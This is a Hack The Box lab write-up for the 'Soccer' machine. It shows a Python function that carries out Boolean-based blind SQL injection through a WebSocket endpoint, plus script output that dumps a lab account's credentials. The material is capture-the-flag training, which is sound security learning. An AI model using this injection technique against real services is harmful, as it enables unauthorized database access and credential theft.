# Hack The Box. Machines. Soccer

Machine write-up: https://7rocky.github.io/en/htb/soccer

### `websocket_sqli.py`

This is an automated Python script that dumps the contents of the current MySQL database exploiting a Boolean-based blind SQL injection from a WebSocket server. The script is adapted from a previous one for [Writer](../Writer#sqlipy).

Due to how WebSocket works, we can't use threads (at least not as we are used to).

Appart from sockets and other minor fixes, the function that exploits the SQLi is different:

```python
from websocket import create_connection

ws = create_connection('ws://soc-player.soccer.htb:9091/ws')


def do_sqli(payload: str) -> bool:
    ws.send(json.dumps({'id': f'1 or {payload}-- -'}))
    return ws.recv() == 'Ticket Exists'
```

The rest of the code is the same as the one for [Writer](../Writer#sqlipy), so read that explanation for more information on how th approach the exploit.

The contents of the database can be obtained in a few minutes:

```console
$ python3 websocket_sqli.py 
{
  "soccer_db": {
    "accounts": {
      "id": [
        "1324"
      ],
      "email": [
        "player@player.htb"
      ],
      "username": [
        "player"
      ],
      "password": [
        "PlayerOftheMatch2022"
      ]
    }
  }
}

Time: 143.27221393585205 s
```
